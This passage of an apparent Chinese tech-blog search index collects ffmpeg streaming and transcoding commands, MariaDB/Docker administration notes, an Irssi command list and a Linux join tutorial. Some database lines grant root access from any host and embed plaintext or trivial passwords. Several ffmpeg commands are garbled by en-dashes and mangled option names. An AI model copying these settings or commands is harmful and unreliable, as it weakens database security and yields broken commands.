copy -acodec copy  -rtsptransport tcp -f rtsp rtsp://127.0.0.1/test.sdp\n\n也可以进行音视频转码后推送：\nffmpeg -i rtsp://218.204.223.237:554/live/1/67A7572844E51A64/f68g2mj7wjua3la7.sdp -vcodec libx264 -an  -rtsptransport tcp -f rtsp rtsp://127.0.0.1/test.sdp\n\n第一步：用ffmpeg将网络直播源拉取到内网，切片成m3u8+ts（这里我们假设直播源为：http://111.1.62.218/gitvlive/CCTV-1-HD/CCTV-1-HD.m3u8）\n\n执行命令：ffmpeg -i http://111.1.62.218/gitvlive/CCTV-1-HD/CCTV-1-HD.m3u8 -f hls -hlslistsize 5 -hlstime 10 -hlswrap 10 ./live/live.m3u8\n###################\n1.分离视频音频流\n\nffmpeg -i inputfile -vcodec copy -an outputfilevideo　　//分离视频流\nffmpeg -i inputfile -acodec copy -vn outputfileaudio　　//分离音频流\n2.视频解复用\n\nffmpeg –i test.mp4 –vcodec copy –an –f m4v test.264\nffmpeg –i test.avi –vcodec copy –an –f m4v test.264\n3.视频转码\n\nffmpeg –i test.mp4 –vcodec h264 –s 352278 –an –f m4v test.264              //转码为码流原始文件\nffmpeg –i test.mp4 –vcodec h264 –bf 0 –g 25 –s 352278 –an –f m4v test.264  //转码为码流原始文件\nffmpeg –i test.avi -vcodec mpeg4 –vtag xvid –qsame testxvid.avi            //转码为封装文件\n//-bf B帧数目控制，-g 关键帧间隔控制，-s 分辨率控制\n4.视频封装\n\nffmpeg –i videofile –i audiofile –vcodec copy –acodec copy outputfile\n5.视频剪切\n\nffmpeg –i test.avi –r 1 –f image2 image-%3d.jpeg        //提取图片\nffmpeg -ss 0:1:30 -t 0:0:20 -i input.avi -vcodec copy -acodec copy output.avi    //剪切视频\n//-r 提取图像的频率，-ss 开始时间，-t 持续时间\n6.视频录制\n\nffmpeg –i rtsp://192.168.3.205:5555/test –vcodec copy out.avi\n7.YUV序列播放\n\nffplay -f rawvideo -videosize 1920x1080 input.yuv\n8.YUV序列转AVI\n\nffmpeg –s wh –pixfmt yuv420p –i input.yuv –vcodec mpeg4 output.avi\n\n常用参数说明：\n\n主要参数：\n-i 设置输入流\n-f 设置输出格式\n-ss 开始时间\n-re 按照帧率发送\n\n视频参数：\n-b 设定视频流量，默认为200Kbit/s\n-b:v  设置码率-b bitrate          video bitrate (please use -b:v)\n-r 设定帧速率，默认为25\n-s 设定画面的分辨率 -s 640x480\n-aspect 设定画面的比例\n-vn 不处理视频\n-vcodec 设定视频编解码器，未设定时则使用与输入流相同的编解码器\n-c:v  设置视频编码器\n\n音频参数：\n-ar 设定采样率\n-ac 设定声音的Channel数\n-acodec 设定声音编解码器，未设定时则使用与输入流相同的编解码器\n-an 不处理音频\n-c:a  设置音频编码器\n\nffmpeg -formats       #查看所有支持的容器格式\nffmpeg -codecs        #查看所有编解码器\nffmpeg -filters       #查看所有可用的filter\n                    -vf 视频过滤器 -vf filtergraph    set video filters\n                    -vf setpts=PTS/3 3倍视频\n\n                    -af 音频过滤器\n                    -af atempo=2\nffmpeg -pixfmts      #查看所有支持的图片格式\nffmpeg -samplefmts   #查看所有支持的像素格式\nffprobe -i money.mp4  #查看媒体信息\n\n-buildconf          show build configuration\n-formats            show available formats\n-devices            show available devices\n-codecs             show available codecs\n                   D..... = Decoding supported\n                   .E.... = Encoding supported\n                   ..V... = Video codec\n                   ..A... = Audio codec\n                   ..S... = Subtitle codec\n                   ...I.. = Intra frame-only codec\n                   ....L. = Lossy compression\n                   .....S = Lossless compression\n                   -c:v  libx264 设置视频编码器\n                   -c:a  设置音频编码器\n\n-decoders           show available decoders\n-encoders           show available encoders\n-protocols          show available protocols\n\n格式转换\nffmpeg -i money.mp4 -c:v mpeg2video -b:v 500k -c:a libmp3lame -f mpegts money.ts\nffmpeg -i money.mp4 -c:v libx264 -minrate:v 500k -maxrate:v 500k -bufsize:v 125k -c:a libmp3lame -f mpegts money.ts\nffmpeg -i money.mp4 -c:v libx264 -x264opts bitrate=500:vbv-maxrate=500:vbv-bufsize=166:nalhrd=cbr  -c:a libmp3lame -f mpegts moneycbr500k.ts\n-i    输入文件名\n-f    设置文件输出格式（容器）\n-c:v  设置视频编码器\n-c:a  设置音频编码器\n-b:v  设置码率-b bitrate          video bitrate (please use -b:v)\n-minrate:v 500k -maxrate:v 500k -bufsize:v 125k  设置CBR（不太好用）\n-x264opts bitrate=500:vbv-maxrate=500:vbv-bufsize=166:nalhrd=cbr  设置CBR（好用）\n\n选择其中第一个视频流输出，设置码率\nffmpeg -i money.mp4 -map 0:v:0 -c:v libx264 -b:v 500k money500k.mp4\nffmpeg -i money.mp4 -map 0:v:0 -c:v libx264 -b:v 300k money300k.mp4\nffmpeg -i money.mp4 -map 0:v:0 -c:v libx264 -b:v 100k -s 336x188 money100k.mp4\n选择其中第一个音频流输出\nffmpeg -i money.mp4 -map 0:a:0 moneyaudio.mp4\n\n[ffmpeg RTMP]\n1、ffmpeg 推送视频文件，音视频的编码格式只能为H264、AAC。\n    ffmpeg -re -i \"E:\\片源\\复仇者联盟720p.mov\" -vcodec copy -acodec copy -f flv rtmp://192.168.11.75/live/test1  \n    ffmpeg -re -i \"E:\\片源\\复仇者联盟720p.mov\" -vcodec copy -acodec copy -f flv rtmpt://192.168.11.75:8080/live/test1\n\n2、网络摄像机 rtsp流转推rtmp直播(不过有丢包情况，还请大家多给指点)\n\tffmpeg -i rtsp://ip address/original -crf 30 -preset ultrafast -acodec aac -strict experimental -ar 44100 -ac 2 -b:a 96k -vcodec libx264 -r 25 -b:v 500k -s 640480 -f flv rtmp://ip address/live/stram\n\n转换为flv:\n    ffmpeg -i test.mp3 -ab 56 -ar 22050 -b 500 -r 15 -s 320x240 test.flv\n    ffmpeg -i test.wmv -ab 56 -ar 22050 -b 500 -r 15 -s 320x240 test.flv\n\n 转换文件格式的同时抓缩微图：\n    ffmpeg -i \"test.avi\" -y -f image2 -ss 8 -t 0.001 -s 350x240 'test.jpg'\n\n  对已有flv抓图：\n    ffmpeg -i \"test.flv\" -y -f image2 -ss 8 -t 0.001 -s 350x240 'test.jpg'\n\n  转换为3gp:\n    ffmpeg -y -i test.mpeg -bitexact -vcodec h263 -b 128 -r 15 -s 176x144 -acodec aac -ac 2 -ar 22500 -ab 24 -f 3gp test.3gp\n    ffmpeg -y -i test.mpeg -ac 1 -acodec amrnb -ar 8000 -s 176x144 -b 128 -r 15 test.3gp\n\n#############\n先把ts流中的格式转换对，可以用以下命令试试：\nffmpeg -i your.ts -acodec copy -vcodec libx264 new.h264.ts\n利用ffmepg把ts文件转m3u8并切片\nffmpeg -i 12生肖.ts -c copy -map 0 -f segment -segmentlist playlist.m3u8 -segmenttime 10 output%03d.ts\n\nffmpeg -i test456.mp4 -f  segment -segmenttime 10  -segmentformat mpegts -segmentlistlistfile.m3u8 -codec copy -bsf:v h264mp4toannexb -map 0 outputfile-%d.ts\n\n音频转换：\n\n1.转换amr到mp3：\n\nffmpeg -i shenhuxi.amr amr2mp3.mp3\n2.转换amr到wav：\n\nffmpeg -acodec libamrnb -i shenhuxi.amr amr2wav.wav\n3.转换mp3到wav：\n\nffmpeg -i DING.mp3 -f wav test.wav\n4.转换wav到amr：\n\nffmpeg -i test.wav -acodec libamrnb -ab 12.2k -ar 8000 -ac 1 wav2amr.amr\n\nffmpeg.exe -i PA003.wav -ar 8000 -ab 12.2k -ac 1 target.amr  此方法验证通过\n文章来自http://blog.csdn.net/tylz04/article/details/9041739\n测试程序下载：http://files.cnblogs.com/xiaofengfeng/WavConvertAmr.zip 已测试过将WAV转AMR格式。\n下载地址http://ftp.pconline.com.cn/d56bb83a0a66440d54ef5473f548e4b9/pub/download/201010/ffmpeg-20131021.zip\n5.转换wav到mp3：\n\nffmpeg -i test.wav -f mp3 -acodec libmp3lame -y wav2mp3.mp3\n视频转换：\n\n1.转换wmv到mp4：\n\nffmpeg -i sample.wmv -vcodec libx264 -acodec aac out.mp4\n2.抓取H264视频流：\n\nffmpeg -i sample.flv -vcodec copy -vbsf h264mp4toannexb -an out.h264\n 2.1 vbsf为过滤方法，即将flv规定的H264组织方式转换回H264协议书规定的字节流格式  2.2 -an 禁掉源文件中的音频，因为出来的码流不需要音频  2.3 vcodec copy这个是必然的\n\n3.将H264视频流转为mp4:\n\nffmpeg -i sample.h264 -f mp4 haha.mp4\n4.接收rtsp并存为视频文件：\n\nffmpeg -rtsptransport tcp -i rtsp://streaming1.osu.edu/media2/ufsap/ufsap.mov -vcodec copy -acodec copy -t 30 -f mp4 rtsp-out.mp4\n4.1 -rtsptransport tcp:指明传输方式是tcp方式(也可以是udp)\n\n4.2 -t 30：指明我录制30秒\n\nffmpeg将音频或视频编码为AMR格式音频\n\nAndroid编码的MP4音频格式可能为AMR，这时候用以下命令可以从MP4中直接提取AMR音频：\nffmpeg -i test.mp4 -c:a copy test.amr\n将其他格式的音频或视频转成AMR的命令：\n新写法：\nffmpeg -i test.mp4 -c:a libopencoreamrnb -ac 1 -ar 8000 -b:a 12.20k -y test.amr\n旧写法：\nffmpeg -i test.mp4 -acodec libopencoreamrnb -ac 1 -ar 8000 -ab 12.20k -y test.amr\n#####################################\n FFmpeg发送流媒体的命令（UDP，RTP，RTMP）\n 这两天研究了FFmpeg发送流媒体的命令，在此简单记录一下以作备忘。\nUDP\n1.1. 发送H.264裸流至组播地址\n注：组播地址指的范围是224.0.0.0—239.255.255.255\n下面命令实现了发送H.264裸流“chunwan.h264”至地址udp://233.233.233.223:6666\n\nffmpeg -re -i chunwan.h264 -vcodec copy -f h264 udp://233.233.233.223:6666  \n注1：-re一定要加，代表按照帧率发送，否则ffmpeg会一股脑地按最高的效率发送数据。\n注2：-vcodec copy要加，否则ffmpeg会重新编码输入的H.264裸流。\n1.2. 播放承载H.264裸流的UDP\n\nffplay -f h264 udp://233.233.233.223:6666  \n注：需要使用-f说明数据类型是H.264\n播放的时候可以加一些参数，比如-maxdelay，下面命令将-maxdelay设置为100ms：\n\nffplay -maxdelay 100000 -f h264 udp://233.233.233.223:6666  \n1.3. 发送MPEG2裸流至组播地址\n下面的命令实现了读取本地摄像头的数据，编码为MPEG2，发送至地址udp://233.233.233.223:6666。\n\nffmpeg -re -i chunwan.h264 -vcodec mpeg2video -f mpeg2video udp://233.233.233.223:6666  \n1.4.  播放MPEG2裸流\n指定-vcodec为mpeg2video即可。\n\nffplay -vcodec mpeg2video udp://233.233.233.223:6666  \nRTP\n2.1. 发送H.264裸流至组播地址。\n下面命令实现了发送H.264裸流“chunwan.h264”至地址rtp://233.233.233.223:6666\n\nffmpeg -re -i chunwan.h264 -vcodec copy -f rtp rtp://233.233.233.223:6666  test.sdp  \n注1：-re一定要加，代表按照帧率发送，否则ffmpeg会一股脑地按最高的效率发送数据。\n注2：-vcodec copy要加，否则ffmpeg会重新编码输入的H.264裸流。\n注3：最右边的“  test.sdp”用于将ffmpeg的输出信息存储下来形成一个sdp文件。该文件用于RTP的接收。当不加“  test.sdp”的时候，ffmpeg会直接把sdp信息输出到控制台。将该信息复制出来保存成一个后缀是.sdp文本文件，也是可以用来接收该RTP流的。加上“  test.sdp”后，可以直接把这些sdp信息保存成文本。\n\n2.2. 播放承载H.264裸流的RTP。\n\nffplay test.sdp  \nRTMP\n3.1. 发送H.264裸流至RTMP服务器（FlashMedia Server，Red5等）\n面命令实现了发送H.264裸流“chunwan.h264”至主机为localhost，Application为oflaDemo，Path为livestream的RTMP URL。\n\nffmpeg -re -i chunwan.h264 -vcodec copy -f flv rtmp://localhost/oflaDemo/livestream  \n3.2. 播放RTMP\n\nffplay “rtmp://localhost/oflaDemo/livestream live=1”  \n注：ffplay播放的RTMP URL最好使用双引号括起来，并在后面添加live=1参数，代表实时流。实际上这个参数是传给了ffmpeg的libRTMP的。\n有关RTMP的处理，可以参考文章：ffmpeg处理RTMP流媒体的命令大全\n\n测延时\n4.1.测延时\n测延时有一种方式，即一路播放发送端视频，另一路播放流媒体接收下来的流。播放发送端的流有2种方式：FFmpeg和FFplay。\n通过FFplay播放是一种众所周知的方法，例如：\n\nffplay -f dshow -i video=\"Integrated Camera\"  \n即可播放本地名称为“Integrated Camera”的摄像头。\n此外通过FFmpeg也可以进行播放，通过指定参数“-f sdl”即可。例如：\n\nffmpeg -re -i chunwan.h264 -pixfmt yuv420p –f sdl xxxx.yuv -vcodec copy -f flv rtmp://localhost/oflaDemo/livestream  \n就可以一边通过SDL播放视频，一边发送视频流至RTMP服务器。\n注1：sdl后面指定的xxxx.yuv并不会输出出来。\n注2：FFmpeg本身是可以指定多个输出的。本命令相当于指定了两个输出。\n###############################\n[ffmpeg处理RTMP流媒体的命令大全]\n最近浏览国外网站时候发现，翻译不准确的敬请谅解。\n\n1、将文件当做直播送至live\n[plain] view plain copy\nffmpeg -re -i localFile.mp4 -c copy -f flv rtmp://server/live/streamName  \n2、将直播媒体保存至本地文件\n[plain] view plain copy\nffmpeg -i rtmp://server/live/streamName -c copy dump.flv  \n3、将其中一个直播流，视频改用h264压缩，音频不变，送至另外一个直播服务流\n[plain] view plain copy\nffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv rtmp://server/live/h264Stream  \n4、将其中一个直播流，视频改用h264压缩，音频改用faac压缩，送至另外一个直播服务流\n[plain] view plain copy\nffmpeg -i rtmp://server/live/originalStream -c:a libfaac -ar 44100 -ab 48k -c:v libx264 -vpre slow -vpre baseline -f flv rtmp://server/live/h264Stream  \n5、将其中一个直播流，视频不变，音频改用faac压缩，送至另外一个直播服务流\n[plain] view plain copy\nffmpeg -i rtmp://server/live/originalStream -acodec libfaac -ar 44100 -ab 48k -vcodec copy -f flv rtmp://server/live/h264AACStream  \n6、将一个高清流，复制为几个不同视频清晰度的流重新发布，其中音频不变\n[plain] view plain copy\nffmpeg -re -i rtmp://server/live/highFMLEstream -acodec copy -vcodec x264lib -s 640×360 -b 500k -vpre medium -vpre baseline rtmp://server/live/baseline500k -acodec copy -vcodec x264lib -s 480×272 -b 300k -vpre medium -vpre baseline rtmp://server/live/baseline300k -acodec copy -vcodec x264lib -s 320×200 -b 150k -vpre medium -vpre baseline rtmp://server/live/baseline150k -acodec libfaac -vn -ab 48k rtmp://server/live/audioonlyAAC48k  \n7、功能一样，只是采用-x264opts选项\n[plain] view plain copy\nffmpeg -re -i rtmp://server/live/highFMLEstream -c:a copy -c:v x264lib -s 640×360 -x264opts bitrate=500:profile=baseline:preset=slow rtmp://server/live/baseline500k -c:a copy -c:v x264lib -s 480×272 -x264opts bitrate=300:profile=baseline:preset=slow rtmp://server/live/baseline300k -c:a copy -c:v x264lib -s 320×200 -x264opts bitrate=150:profile=baseline:preset=slow rtmp://server/live/baseline150k -c:a libfaac -vn -b:a 48k rtmp://server/live/audioonlyAAC48k  \n8、将当前摄像头及音频通过DSSHOW采集，视频h264、音频faac压缩后发布\n[plain] view plain copy\nffmpeg -r 25 -f dshow -s 640×480 -i video=”video source name”:audio=”audio source name” -vcodec libx264 -b 600k -vpre slow -acodec libfaac -ab 128k -f flv rtmp://server/application/stream_name  \n9、将一个JPG图片经过h264压缩循环输出为mp4视频\n[plain] view plain copy\nffmpeg.exe -i INPUT.jpg -an -vcodec libx264 -coder 1 -flags +loop -cmp +chroma -subq 10 -qcomp 0.6 -qmin 10 -qmax 51 -qdiff 4 -flags2 +dct8x8 -trellis 2 -partitions +parti8x8+parti4x4 -crf 24 -threads 0 -r 25 -g 25 -y OUTPUT.mp4  \n10、将普通流视频改用h264压缩，音频不变，送至高清流服务(新版本FMS live=1)\n[plain] view plain copy\nffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv “rtmp://server/live/h264Stream live=1″","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/系统监控/2016-10-04 心跳检测HeartBeat","title":"心跳检测HeartBeat","text":"http://git.oschina.net/mkk/HeartBeat","tags":null},{"location":"//blog.pytool.com/Post/前端技术/Web技术/HTML5+CSS3基础回顾","title":"HTML5+CSS3整体回顾","text":"---\n\n  转载请声明 原文链接\n\n这篇文章主要总结H5的一些新增的功能以及一些基础归纳，并不是很详细，后面会一直完善补充新的内容，本文是一些笔记记录，放在这里供自己参考也供他人学习！\n\n第一课 HTML5结构","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-02-29 mysql MariaDB基础详解","title":"Linux之MariaDB基础详解","text":"---\nLinux之MariaDB基础详解\nMariaDB中文手册\n远程登录 MySQL / MariaDB数据库配置教程\nMysql创建及删除用户命令\nMariaDB/MySQL之用户管理及忘记数据管理员密码解决办法\nMySQL——修改root密码的4种方法\n\n镜像解决方案\n\n    创建并编辑MariaDB的源配置\n\nsudo vi /etc/yum.repos.d/MariaDB.repo\n\n写入配置文件\n\n MariaDB 10.1 CentOS repository list - created 2016-12-31 08:44 UTC\nhttp://downloads.mariadb.org/mariadb/repositories/\n[mariadb]\nname = MariaDB\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/mariadb/yum/10.1/centos7-amd64\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/mariadb/yum//RPM-GPG-KEY-MariaDB\ngpgcheck = 1\n\n执行安装命令\n\nsudo yum install mariadb-server\n\n如果在用阿里云的服务器，可以将上述配置中的域名替换成\n\n    http://mirrors.aliyun.com/\n\n以上yum配置经修改后同样的适用于其他源，详细内容请往下看\nsudo apt-get install mariadb-client\nyum -y install MariaDB-server MariaDB-client  \nsudo apt-get install mariadb-galera-server galera\n\n 自动补全\nlinux中mysql的配置文件在 /etc/mysql\n\n修改my.cnf\n\n在#no-auto-rehash # faster start of mysql but no tab completition这一行之下添加一行：\n\nauto-rehash\n\n统计\nSELECT ktitle,COUNT() FROM ultrax.prefxvotelog WHERE kid = '89' \n Mysql查询数据表中某字段重复出现的次数，并按照次数排序\nselect [name],count() from [data] group by [name] order by count() DESC limit 10\nSELECT ktitle,COUNT() FROM ultrax.prefxvotelog` group by ktitle order by count() DESC limit 15\n`\n开启 mysql 查询日志\n\n| generallog                               | ON                                                                                                           |\n| generallogfile                          | /var/log/mysql/mysql.log\n\nmysql  set global generallogfile='/tmp/general.log';\n\nmysql  set global generallog=on;\n\nmysql  set global generallog=off;\n \t \u0026\u0026 sed -i -e \"s/^#generallogfile/generallogfile/\" /etc/mysql/my.cnf\\\n\u0026\u0026 sed -i -e \"s/^generallog/generallog/\" /etc/mysql/my.cnf\\\n\u0026\u0026 sed -i -e \"s/^logslowqueries/logslowqueries/\" /etc/mysql/my.cnf\\\n\u0026\u0026 sed -i -e \"s/^longquerytime./longquerytime = 1/\" /etc/mysql/my.cnf\nmysql 配置超时时间\nshow global variables like '%timeout%';\n\n设置超时时间，临时生效（以秒为单位）：\n  msyql  set global waittimeout=86400;\n  msyql  set global interactivetimeout=86400;\n修改配置文件/etc/my.cnf.d/server.conf\n        在 [mysqld]下添加\n            waittimeout=86400\n            sed -i 's/^interactive-timeout./interactive-timeout = 86400/' /etc/my.cnf\n            sed -i 's/^wait-timeout./wait-timeout = 86400/' /etc/my.cnf\n mysql 编码问题\n解决: 保持mariadb 版本一致  mariadb:5.5\n如下脚本创建数据库yourdbname，并制定默认的字符集是utf8: CREATE DATABASE IF NOT EXISTS yourdbname DEFAULT CHARSET utf8 COLLATE utf8generalci;\nCOLLATE utf8generalci:  数据库校对规则。该三部分分别为数据库字符集、通用、区分大小写。\nutf8unicodeci比较准确，utf8generalci速度比较快。通常情况下 utf8generalci的准确性就够我们用的了，在我看过很多程序源码后，发现它们大多数也用的是utf8generalci，所以新建数据 库时一般选用utf8generalci就可以了。\n如果要创建默认gbk字符集的数据库可以用下面的sql:create database yourdb DEFAULT CHARACTER SET gbk COLLATE gbkchineseci;\nERROR 1045 (28000): Access denied for user 'root'@'172.17.0.4' (using password: YES)\n解决方法：密码输入错误，仔细检查密码\n 权限问题 Do you already have another mysqld server running on socket: /var/run/mysqld/mysqld.sock ?\nid mysql\nuid=27(mysql) gid=27(mysql) groups=27(mysql)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n sudo userdel mysql \n sudo groupadd -r -g 999 mysql \u0026\u0026 sudo useradd -r -u 999  -c mysql -g mysql -d /var/lib/mysql -s /usr/sbin/nologin mysql \n sudo gpasswd -a ${USER} mysql \n sudo chown -R mysql:mysql /var/lib/mysql /var/run/mysqld \n docker run -d --name mysql -v $PWD/database/mysql:/var/lib/mysql -v /var/run/mysqld:/var/run/mysqld -e MYSQLROOTPASSWORD=root mysql \n docker exec -it mysql bash \nusermod -u 999 mysql\ngroupmod -g 999 mysql\n find / -user 1005 -exec chown -h foo {} \\;\n find / -group 2000 -exec chgrp -h foo {} \\;\n\ndocker\n sudo chown -R 999:999 /var/run/mysqld\n\n docker run -d --restart=always --name mariadb -p 3306:3306 -e MYSQLROOTPASSWORD= -v /docker/mysql:/var/lib/mysql rinetd/mariadb \n MySQL数据库从GBK转换到UTF-8最简单解决方案\n--default-character-set=utf8 指定导出sql文件编码utf8格式\n\n1、使用mysqldump导出 [表结构]，如：\n      mysqldump -d -u root -p 数据库名   /root/struct.sql\n\n2、使用mysqldump以[指定utf8编码]导出[表数据]（其中--default-character-set=utf8 为所需编码，可按需修改），如：\n\n      mysqldump --default-character-set=utf8 -t -u root -p 数据库名   /root/data.sql\n\n3、打开表结构转存（/root/struct.sql），将所有CREATE TABLE中的编码替换为所需编码；\n      DEFAULT CHARSET=gbk; =  DEFAULT CHARSET=utf8 ; \n\n4、进入MySQL控制台，执行：\n      source /root/struct.sql\n      source /root/data.sql\n     即可完成。\n\n导出表时，如果出现1044错误，添加   --skip-lock-tables  可以解决：\nmysqldump -d -u root -p 数据库名 --skip-lock-tables   /root/struct.sql\nmysqldump --default-character-set=utf8 -t -u root -p 数据库名 --skip-lock-tables   /root/data.sql\n\ndedecms GBK 转 UTF8\ndocker exec -i mariadb mysqldump -d -uroot -p guoan   guoanstuct.sql\ndocker exec -i mariadb mysqldump -t --default-character-set=utf8 -uroot -p guoan   guoan.sql\n\nMySQL 如何设置不区分表名大小写。\n一般情况下 Linux 服务器默认安装 MySQL 的数据库表名是区分大小写的，如果 ECS 上安装的 MySQL 不支持表名区分大小下，则按照如下方法操作即可：\n\n用 root 登录，修改 /etc/my.cnf （注意：以实际 my.cnf 配置文件路径为准）\n在 [mysqld] 节点下，加入一行： lowercasetablenames=1\n重启 MySQL 即可；\n\nGRANT SELECT, INSERT, UPDATE, REFERENCES, DELETE, CREATE, DROP, ALTER, INDEX, TRIGGER, CREATE VIEW, SHOW VIEW, EXECUTE, ALTER ROUTINE, CREATE ROUTINE, CREATE TEMPORARY TABLES, LOCK TABLES, EVENT\n ON wechat. TO 'wechat';\n\nGRANT GRANT OPTION ON wechat. TO 'wechat';\n\ngrant select, insert, update, delete, create, drop, references, index, alter,\n        create temporary tables, lock tables, create view, show view, create routine,\n        alter routine, execute, trigger       \non Sample. to 'acme-manager'@'%';\n\ngrant create,select,insert,update,create view,show view,event,alter,trigger,index,alter on fgg. to 'allen2016'@'%' identified by\n'allen2016soft88' with grant option;\nflush privileges;\n\n执行命令\n docker exec -i mariadb mysql -uroot -pXXXX -e \"show databases;\" \n docker exec -i mariadb mysql -uroot -pXXXX -e \"show databases; select user,host from mysql.user;\" `\n 创建数据库\n\nCREATE DATABASE IF NOT EXISTS tpcms DEFAULT CHARACTER SET utf8 COLLATE utf8generalci\nCREATE DATABASE IF NOT EXISTS guoan DEFAULT CHARACTER SET utf8 COLLATE utf8generalci\n\n docker exec -i mariadb mysql -uroot -pXXXX -e \"CREATE DATABASE IF NOT EXISTS ytjxc DEFAULT CHARACTER SET utf8 COLLATE utf8generalci\" \n docker exec -i mariadb mysql -uroot -pXXXX -e \"CREATE DATABASE IF NOT EXISTS ytjxc DEFAULT CHARACTER SET utf8 \" \n\n创建并授权用户\n docker exec -i mariadb mysql -uroot -pXXXX -e \"GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'XXXX' WITH GRANT OPTION; FLUSH PRIVILEGES;\" \n docker 有个坑 内网ip不一定都是172.0.0.x 还有可能是192.0.0.x 所以 'user'@'12.%' 保险起见用 'user'@'%'\n docker exec -i mariadb mysql -uroot -pXXXX -e \"GRANT ALL PRIVILEGES  ON . TO 'user'@'12.%' IDENTIFIED BY 'XXXX'; FLUSH PRIVILEGES;\" \n备份全部数据库\n docker exec -it mariadb mysqldump -uroot -proot --all-databases   bak.sql \n 备份指定数据库\n docker exec -it mariadb mysqldump -uroot -proot chengzhi   bak.sql        \n\n恢复指定数据库\n docker exec -i wuyemysql mysql -uroot -ptoor sanyang ","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 Irssi irc","title":"Linux命令 irc","text":"---\nIrssi commands:\naccept     die         knock    notice    sconnect   unload    \naction     disconnect  knockout notify    script     unnotify  \nadmin      echo        lastlog  op        scrollback unquery   \nalias      eval        layout   oper      server     unsilence\naway       exec        links    part      servlist   upgrade   \nban        flushbuffer list     ping      set        uptime    \nbeep       foreach     load     query     sethost    userhost  \nbind       format      log      quit      silence    ver       \ncat        hash        lusers   quote     squery     version   \ncd         help        map      rawlog    squit      voice     \nchannel    hilight     me       recode    stats      wait      \nclear      ignore      mircdcc  reconnect statusbar  wall      \ncompletion info        mode     redraw    time       wallops   \nconnect    invite      motd     rehash    toggle     who       \nctcp       ircnet      msg      reload    topic      whois     \ncycle      ison        names    resize    trace      whowas    \ndcc        join        nctcp    restart   ts         window    \ndehilight  kick        netsplit rmreconns unalias    \ndeop       kickban     network  rmrejoins unban      \ndevoice    kill        nick     save      unignore","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 join","title":"linux命令详解 join","text":"我使用过的Linux命令之join - 根据关键字合并数据文件\n\n本文链接：http://codingstandards.iteye.com/blog/796299   （转载请注明出处）\n\n用途说明\n\nLinux下最常用的数据文件格式是文本格式的，多个字段之间通过分隔符来区分，分隔符比如冒号(:)、制表符、空格等。/etc/passwd和/etc/group就是用:来分隔的，用MySQL的into outfile指令导出的数据通常是以制表符分隔的。这种文本格式既方便人去阅读，也适合程序处理，通常某列类似于数据库中的关键字。join命令就是一个根据关键字合并数据文件的命令（join lines of two files on a common field），类似于数据库中两张表关联查询。\n常用参数\n\njoin命令根据公共字段（关键字）来合并两个文件的数据行。因此最简单的使用方式就是指定两个数据文件名，这两个文件的第一列就是公共字段，字段之间以空白分隔。（For  each  pair  of  input lines with identical join fields, write a line to standard output.  The default join field is the first, delimited by whitespace.  When FILE1 or FILE2 (not both) is -, read standard input.）\n\n内连接（inner join）                              格式：join FILE1 FILE2\n左连接（left join, 左外连接, left outer join）     格式：join -a1 FILE1 FILE2\n右连接（right join, 右外连接,right outer join）    格式：join -a2 FILE1 FILE2\n全连接（full join, 全外连接, full outer join）     格式：join -a1 -a2 FILE1 FILE2\n\n指定分隔符：\n-t CHAR\n比如：-t ':' 使用冒号作为分隔符。默认的分隔符是空白。\n\n指定输出字段：\n-o FILENO.FIELDNO ...\n其中FILENO=1表示第一个文件，FILENO=2表示第二个文件，FIELDNO表示字段序号，从1开始编号。默认会全部输出，但关键字列只输出一次。\n比如：-o 1.1 1.2 2.2 表示输出第一个文件的第一个字段、第二个字段，第二个文件的第二个字段。\n\n使用示例\n示例一 内连接（忽略不匹配的行）\n不指定任何参数的情况下使用join命令，就相当于数据库中的内连接，关键字不匹配的行不会输出。\n\n[root@rhel55 linux]# cat monthcn.txt\n1       一月\n2       二月\n3       三月\n4       四月\n5       五月\n6       六月\n7       七月\n8       八月\n9       九月\n10      十月\n11      十一月\n12      十二月\n13      十三月，故意的\n[root@rhel55 linux]# cat monthen.txt\n1       January\n2       February\n3       March\n4       April\n5       May\n6       June\n7       July\n8       August\n9       September\n10      October\n11              November\n12      December\n14      MonthUnknown\n\n注：注意两个文件的内容，中文版的多了十三月，英文版的多了14月，这纯粹是为了方便演示。\n[root@rhel55 linux]# join monthcn.txt monthen.txt\n1 一月 January\n2 二月 February\n3 三月 March\n4 四月 April\n5 五月 May\n6 六月 June\n7 七月 July\n8 八月 August\n9 九月 September\n10 十月 October\n11 十一月 November\n12 十二月 December\n[root@rhel55 linux]#\n示例二 左连接（又称左外连接，显示左边所有记录）\n\n显示左边文件中的所有记录，右边文件中没有匹配的显示空白。\n\n[root@rhel55 linux]# join -a1 monthcn.txt monthen.txt  \n1 一月 January\n2 二月 February\n3 三月 March\n4 四月 April\n5 五月 May\n6 六月 June\n7 七月 July\n8 八月 August\n9 九月 September\n10 十月 October\n11 十一月 November\n12 十二月 December\n13 十三月，故意的\n[root@rhel55 linux]#\n\n示例三 右连接（又称右外连接，显示右边所有记录）\n\n显示右边文件中的所有记录，左边文件中没有匹配的显示空白。\n\n[root@rhel55 linux]# join -a2 monthcn.txt monthen.txt\n1 一月 January\n2 二月 February\n3 三月 March\n4 四月 April\n5 五月 May\n6 六月 June\n7 七月 July\n8 八月 August\n9 九月 September\n10 十月 October\n11 十一月 November\n12 十二月 December\n14 MonthUnknown\n[root@rhel55 linux]#\n\n示例四 全连接（又称全外连接，显示左边和右边所有记录）\n\n[root@rhel55 linux]# join -a1 -a2 monthcn.txt monthen.txt\n1 一月 January\n2 二月 February\n3 三月 March\n4 四月 April\n5 五月 May\n6 六月 June\n7 七月 July\n8 八月 August\n9 九月 September\n10 十月 October\n11 十一月 November\n12 十二月 December\n13 十三月，故意的\n14 MonthUnknown\n[root@rhel55 linux]#\n\n示例五 指定输出字段\n\n比如参数 -o 1.1 表示只输出第一个文件的第一个字段。\n\n[root@rhel55 linux]# join -o 1.1 monthcn.txt monthen.txt\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n[root@rhel55 linux]# join -o 1.1 2.2 monthcn.txt monthen.txt  \n1 January\n2 February\n3 March\n4 April\n5 